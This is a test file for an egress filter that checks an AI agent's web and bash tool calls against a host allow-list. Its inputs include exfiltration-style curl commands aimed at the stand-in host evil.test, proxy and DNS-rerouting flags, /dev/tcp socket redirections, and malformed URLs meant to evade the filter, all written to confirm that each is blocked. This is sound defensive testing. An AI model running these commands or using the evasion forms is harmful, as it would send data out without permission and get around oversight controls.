import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createPipelineBed, interactiveRules } from "../testing/pipeline-bed.ts";
import { egressStage, judgeUrl, urlsInString } from "./egress.ts";
import type { CallFacts } from "./pipeline.ts";
import { classifyTool } from "./tool-kind.ts";

let bed: Awaited<ReturnType<typeof createPipelineBed>>;
beforeAll(async () => {
  bed = await createPipelineBed();
});
afterAll(() => bed.dispose());

const OK = "ok";
const EVIL = "web host not allowed: evil.test";
const UNREADABLE = "unreadable URL";
const CLIENT = (word: string) => `host not checkable: ${word}`;

/** Stage 02 on its own, against a list: its real outcome, compared exactly. */
function verdictOf(tool: "web" | "bash", input: unknown, allow: string[] = ["example.com"]): string {
  const kind =
    tool === "bash"
      ? classifyTool("bash", { path: "builtin:bash" })
      : classifyTool("web", { path: "/ext/web.js" });
  const call: CallFacts = {
    event: { toolCallId: "c1", toolName: tool, input },
    kind,
    rules: { ...interactiveRules, allowHosts: allow },
    cwd: bed.cwd,
    tainted: false,
    key: "k",
    exec: kind.category === "exec",
  };
  const verdict = egressStage(call);
  if (verdict.outcome === "block") return verdict.reason;
  return verdict.outcome === "pass" ? OK : `unexpected: ${verdict.reason}`;
}
const bash = (command: string, allow?: string[]) => verdictOf("bash", { command }, allow);
const text = (value: string) => verdictOf("web", { text: value });

describe("WHATWG forms without ://", () => {
  it.each([
    ["https:evil.test/?k=1", EVIL],
    ["https:/evil.test", EVIL],
    ["https:\\\\evil.test", UNREADABLE],
    ["https:/\t/evil.test", UNREADABLE],
    ["https:\n//evil.test", UNREADABLE],
    ["ht\ttps:evil.test", UNREADABLE],
    ["HTTPS:EVIL.TEST", EVIL],
    ["ws:evil.test", EVIL],
    ["ftp:evil.test", "ftp: URL"],
    ["https:example.com", OK],
  ])("%j", (value, expected) => {
    expect(text(value)).toBe(expected);
  });
  it("judges a shell word of that form", () => {
    expect(bash("curl https:evil.test/?k=1")).toBe(EVIL);
    expect(bash("curl https:example.com/")).toBe(OK);
  });
});

describe("a host outside the host-name alphabet never matches a wildcard", () => {
  const wild = ["*.example.com"];
  it.each([
    ["https://$H.example.com/?k=1", UNREADABLE],
    ["https://${H}.example.com/?k=1", UNREADABLE],
    ["https://a'b.example.com/", UNREADABLE],
    ["https://.example.com/", UNREADABLE],
    ["https://a..example.com/", UNREADABLE],
    ["https://a!b.example.com/", UNREADABLE],
    ["https://a*b.example.com/", UNREADABLE],
    ["https://api.example.com/", OK],
  ])("%s", (url, expected) => {
    const verdict = judgeUrl(url, wild);
    expect(verdict.ok ? OK : verdict.why).toBe(expected);
  });
  it("blocks the shell form", () => {
    expect(bash("curl https://$H.example.com/?k=1", ["*.example.com"])).toBe(UNREADABLE);
    expect(bash("curl https://${H}.example.com/?k=1", ["*.example.com"])).toBe(UNREADABLE);
  });
});

describe("touching URLs are judged one by one", () => {
  it.each([
    ["[a](https://example.com/)[b](https://evil.test/?k=1)", EVIL],
    ["https://example.com/x,https://evil.test/?k=1", EVIL],
    ["https://example.com/https://evil.test/x", EVIL],
    ["see https://example.com/a|https://evil.test/b", EVIL],
    ["see https://example.com/a and https://example.com/b", OK],
  ])("%j", (value, expected) => {
    expect(text(value)).toBe(expected);
  });
  it("cuts where the next scheme starts, each piece trimmed", () => {
    const out: string[] = [];
    urlsInString("x https://example.com/a),https://evil.test/b.", out);
    expect(out).toEqual(["https://example.com/a", "https://evil.test/b"]);
  });
  it("stays bounded on a million touching schemes", { timeout: 2000 }, () => {
    expect(text("a://".repeat(250_000))).toBe("input too complex for the egress check");
  });
});

describe("git options with a separate value", () => {
  it.each([
    ["git --git-dir .git push", CLIENT("git")],
    ["git --work-tree . fetch origin", CLIENT("git")],
    ["git --namespace x push", CLIENT("git")],
    ["git --super-prefix p/ pull", CLIENT("git")],
    ["git --config-env k=V clone x", CLIENT("git")],
    ["git --git-dir=.git push", CLIENT("git")],
    ["git --git-dir .git status", OK],
    ["git --work-tree . log", OK],
  ])("%s", (command, expected) => {
    expect(bash(command)).toBe(expected);
  });
});

describe("a client rerouted or fed by a redirection", () => {
  it.each([
    ["curl evil.test > https://example.com/out", CLIENT("curl")],
    ["curl evil.test <<< https://example.com", CLIENT("curl")],
    ["curl -x proxy.evil:8080 https://example.com", CLIENT("curl")],
    ["curl --proxy=evil:80 https://example.com", CLIENT("curl")],
    ["curl --preproxy evil:80 https://example.com", CLIENT("curl")],
    ["curl --resolve example.com:443:6.6.6.6 https://example.com/", CLIENT("curl")],
    ["curl --connect-to ::evil:443 https://example.com", CLIENT("curl")],
    ["curl --socks5-hostname evil:1080 https://example.com", CLIENT("curl")],
    ["curl -sx evil:80 https://example.com", CLIENT("curl")],
    ["curl -xevil:80 https://example.com", CLIENT("curl")],
    ["curl --doh-url https://doh.evil.test https://example.com", "web host not allowed: doh.evil.test"],
    ["curl -x https://example.com https://example.com", OK],
    ["curl -s -o out https://example.com", OK],
    ["curl https://example.com evil.test", OK], // documented pass (M5R118): a scheme-less host next to an allowed URL
  ])("%s", (command, expected) => {
    expect(bash(command)).toBe(expected);
  });
  it("still judges a URL in a redirection target", () => {
    expect(bash("echo hi > https://evil.test/x")).toBe(EVIL);
  });
});

describe("shell network devices", () => {
  it.each([
    ["echo hi > /dev/tcp/evil.test/80", CLIENT("/dev/tcp")],
    ["cat < /dev/udp/evil.test/53", CLIENT("/dev/udp")],
    ["exec 3<>/dev/tcp/evil.test/80", CLIENT("/dev/tcp")],
    ["cat /dev//tcp/evil.test/80", CLIENT("/dev/tcp")],
    ["ls /dev/null", OK],
  ])("%s", (command, expected) => {
    expect(bash(command)).toBe(expected);
  });
});

describe("object keys and a command that is not a string", () => {
  it("scans a key as a string", () => {
    expect(verdictOf("web", { "https://evil.test/?k=1": 1 })).toBe(EVIL);
    expect(verdictOf("web", JSON.parse('{"a":{"https://evil.test/x":true}}'))).toBe(EVIL);
    expect(verdictOf("web", { "https://example.com/": 1 })).toBe(OK);
  });
  it("walks the whole input of a built-in shell call whose command is no string", () => {
    expect(verdictOf("bash", { command: 5, url: "https://evil.test" })).toBe(EVIL);
    expect(verdictOf("bash", { command: ["curl", "https://evil.test"] })).toBe(EVIL);
    expect(verdictOf("bash", { command: null })).toBe(OK);
  });
});
